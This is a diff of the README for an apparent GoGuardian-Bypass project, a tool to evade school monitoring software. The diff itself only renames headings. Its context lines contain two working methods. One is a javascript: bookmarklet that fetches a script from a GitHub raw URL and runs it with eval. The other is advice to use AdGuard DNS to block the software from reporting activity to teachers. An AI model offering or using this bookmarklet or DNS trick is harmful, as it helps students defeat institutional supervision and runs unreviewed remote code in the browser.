@@ -9,7 +9,8 @@ GoGuardian is a pretty flawed piece of software. It has been bypassed many times
 Not only can it be bypassed using a few lines of code, but it can also be outright stopped from sending data to the teachers to track what you're doing, by using AdGuard DNS (94.140.14.14).
 This is a POC showing how flawed GoGuardian is for the price, and how other, much less expensive, if not, free, options are much better.* (from the website)
 COMPATIBILITY MODE WAS FIXED BY GOOGLE, SOWWY :rage3:
-## My Own Modification
+
+## My Own Modification.
 
 Just to clarify this is the source that i found out this is possible and added my own moddification
 https://github.com/ech0devv/GoGuardian-Bypass
@@ -28,7 +29,7 @@ Website: https://goguardian-bypass.gamerverses.repl.co
 javascript:req = new XMLHttpRequest();req.open('GET', 'https://raw.githubusercontent.com/GamerVerse722/GoGuardian-Bypass/main/assets/js/request.js');req.onload = function() {	eval(this.responseText + 'codeRunner();');};req.send();
 ```
 
-## What's the code for it?
+## How it works.
 
 
 Here's a very basic example of how it works:
